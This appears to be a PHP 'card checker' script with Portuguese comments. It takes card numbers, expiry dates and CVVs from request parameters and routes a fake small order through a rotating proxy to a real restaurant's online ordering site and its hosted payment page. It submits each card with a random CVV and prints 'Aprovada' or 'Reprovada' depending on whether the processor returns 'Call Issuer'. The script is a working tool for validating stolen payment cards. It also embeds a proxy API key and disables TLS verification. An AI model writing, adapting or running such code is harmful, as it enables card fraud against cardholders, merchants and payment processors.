<?php
libxml_use_internal_errors(true);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

if (file_exists(getcwd() . '/cookies.txt')) {
    @unlink('cookies.txt');
}

##################################################

extract($_GET);
$login= str_replace(array(":", ";", ",", "|", "»", "/", "\\", " "), "|", $login);
$separa = explode("|", $login);
$cc = trim($separa[0]);
$mes = trim($separa[1]);
$ano = trim($separa[2]);
$cvv = trim($separa[3]);
$cvv_random = substr(mt_rand() , 0, 3);
$bin2 = substr($cc, 0, 2);
$bin6 = substr($cc, 0, 6);


function value($string, $start, $end)
    {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
    }

switch ($ano) {
    
           case '2017':
    
           $ano = '17';
    
           break;
    
           case '2018':
    
           $ano = '18';
    
           break;
    
           case '2019':
    
           $ano = '19';
    
           break;
    
           case '2020':
    
           $ano = '20';
    
           break;
    
           case '2021':
    
           $ano = '21';
    
           break;
    
           case '2022':
    
           $ano = '22';
    
           break;
    
           case '2023':
    
           $ano = '23';
    
           break;
    
           case '2024':
    
           $ano = '24';
    
           break;
    
           case '2025':
    
           $ano = '25';
    
           break;
    
           case '2026':
    
           $ano = '26';
    
           break;
    
           case '2027':
    
           $ano = '27';
    
           break;
    
      }

    switch ($mes)
        {
    case '1':
        $mes = '01';
        break;

    case '2':
        $mes = '02';
        break;

    case '3':
        $mes = '03';
        break;

    case '4':
        $mes = '04';
        break;

    case '5':
        $mes = '05';
        break;

    case '6':
        $mes = '06';
        break;

    case '7':
        $mes = '07';
        break;

    case '8':
        $mes = '08';
        break;

    case '9':
        $mes = '09';
        break;
        }

 ////////////// 1ª PARTE...PREENCHIMENTO DO CARRINHO E RESOLUÇÃO DO CAPTCHA

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, 'https://amarithcafe.revelup.com/weborders/create_order_and_pay_v1/');
curl_setopt($ch, CURLOPT_PROXY, 'http://f1ca55670d414417ad52b796e2242a4d:@proxy.crawlera.com:8010'); 
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: amarithcafe.revelup.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
'Accept: application/json',
'Referer: https://amarithcafe.revelup.com/weborder/?establishment=1#checkout',
'Content-Type: application/x-www-form-urlencoded',
'Connection: keep-alive'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"skin":"weborder","establishmentId":1,"items":[{"modifieritems":[],"special_request":"","price":1.5,"product":209,"product_name_override":"Fountain Soda 22oz","quantity":1,"product_sub_id":"c1160"}],"orderInfo":{"created_date":"2020-01-27T16:47:31","pickup_time":"2020-01-31T15:45:00","dining_option":0,"notes":"","asap":false,"customer":{"phone":"0001234567890","email":"boblee7878@aol.com","first_name":"Bob","last_name":"Lee"},"call_name":"Bob Lee / Jan 31, 7:45am / 0001234567890"},"paymentInfo":{"tip":0,"type":2,"cardInfo":{"firstDigits":"","lastDigits":"","firstName":"","lastName":"","address":null}},"notifications":[{"skin":"weborder","type":"email","destination":"boblee7878@aol.com"}],"recaptcha_v2_token":"TOKEN RESOLVIDO AQUI"}');
$resultado4 = curl_exec($ch);
$id_pagamento = value ($resultado4,'"TransactionSetupID": "','"'); ////////////// CAPTURANDO O LINK DO PAGAMENTO


////////////// 2ª PARTE...CAPTURANDO __VIEWSTATE , __VIEWSTATEGENERATOR , __EVENTVALIDATION DO LINK DE PAGAMENTO

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://transaction.hostedpayments.com/?TransactionSetupID='.$id_pagamento.'');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: transaction.hostedpayments.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Connection: keep-alive',
'Upgrade-Insecure-Requests: 1',
));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
$resultado5 = curl_exec($ch);

$vstate = value ($resultado5,'name="__VIEWSTATE" id="__VIEWSTATE" value="','"');
$vstate = urlencode ($vstate);
//adonis make:controller GetCaptcha

$vgenerator = value ($resultado5,'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="','"');


$vvalidation = value ($resultado5,'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="','"');
$vvalidation = urlencode ($vvalidation);

////////////// 3ª PARTE...ENVIANDO O PAGAMENTO COM O NUMERO DO CARD, MES E ANO, CVV RANDOM E  __VIEWSTATE , __VIEWSTATEGENERATOR , __EVENTVALIDATION DO LINK DE PAGAMENTO

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://transaction.hostedpayments.com/?TransactionSetupID=E6962809-4367-4175-AFBF-F32ECD817313');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: transaction.hostedpayments.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
'Accept: */*',
'X-Requested-With: XMLHttpRequest',
'X-MicrosoftAjax: Delta=true',
'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
'Connection: keep-alive',
'Referer: https://transaction.hostedpayments.com/?TransactionSetupID=E6962809-4367-4175-AFBF-F32ECD817313',
));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'scriptManager=upFormHP%7CprocessTransactionButton&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE='.$vstate.'&__VIEWSTATEGENERATOR='.$vgenerator.'&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION='.$vvalidation.'&hdnCancelled=&cardNumber=%20'.$cc.'&ddlExpirationMonth='.$mes.'&ddlExpirationYear='.$ano.'&CVV='.$cvv_random.'&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&__ASYNCPOST=true&');
$resultado6 = curl_exec($ch);
$mensagem = value ($resultado6,'<b>Error</b>: ','</span>'); ////////////// MOSTRA O RETORNO DO PAGAMENTO


////////////// 4ª PARTE...MOSTRANDO O RESULTADO NA INDEX


    if (strpos($mensagem, 'Call Issuer') !== false) { ////////////// 'Call Issuer' É O RETORNO DE APROVADO
    
echo '<b class="badge badge-primary">#Aprovada</b> <b class="badge badge-light">'.$login.'</b> <b class="badge badge-info">Retorno: Válido</b> <b class="badge badge-success">#el-patron</b><br>';           
}     
    else {
  echo '<b class="badge badge-danger">#Reprovada</b> <b class="badge badge-light">'.$$resultado6 .'</b> <b class="badge badge-danger">Retorno: Inválido</b><br>';
}
 

flush();
ob_flush();
return $mensagem

?>